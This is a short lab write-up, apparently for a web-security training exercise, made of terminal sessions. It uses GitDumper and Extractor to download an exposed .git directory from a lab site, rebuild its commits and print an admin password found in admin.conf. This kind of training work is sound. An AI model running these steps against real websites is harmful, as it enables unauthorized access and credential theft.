# Lab: Information disclosure in version control history

```bash
┌──(kali㉿kali)-[/tmp]
└─$ ~/Tools/GitTools/Dumper/gitdumper.sh https://ac4f1f161fe3e170c0031bc1003400f5.web-security-academy.net/.git/ .
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating ./.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/30/aaf346fc9f454b42f8445ed7825d4ae27f7270
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/82/654bbc57045ce461e88903553f9004efdcd05b
[+] Downloaded: objects/21/54555944002791a4d27412bf6e9a6f29e942fa
[+] Downloaded: objects/c4/804d3a07db3248a24955d985622ea6bf15a647
[+] Downloaded: objects/21/d23f13ce6c704b81857379a3e247e3436f4b26
[+] Downloaded: objects/89/44e3b9853691431dc58d5f4978d3940cea4af2
[+] Downloaded: objects/e1/80696e6cfcb5981eae625bf19645b04237ab4e
```

```bash
┌──(kali㉿kali)-[/tmp]
└─$ ~/Tools/GitTools/Extractor/extractor.sh . dump
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[+] Found commit: 30aaf346fc9f454b42f8445ed7825d4ae27f7270
[+] Found file: /tmp/dump/0-30aaf346fc9f454b42f8445ed7825d4ae27f7270/admin.conf
[+] Found file: /tmp/dump/0-30aaf346fc9f454b42f8445ed7825d4ae27f7270/admin_panel.php
[+] Found commit: 82654bbc57045ce461e88903553f9004efdcd05b
[+] Found file: /tmp/dump/1-82654bbc57045ce461e88903553f9004efdcd05b/admin.conf
[+] Found file: /tmp/dump/1-82654bbc57045ce461e88903553f9004efdcd05b/admin_panel.php
```

```bash
┌──(kali㉿kali)-[/tmp/dump]
└─$ cat 1-82654bbc57045ce461e88903553f9004efdcd05b/admin.conf 
ADMIN_PASSWORD=vksxramhqfvy956wwwrz
```

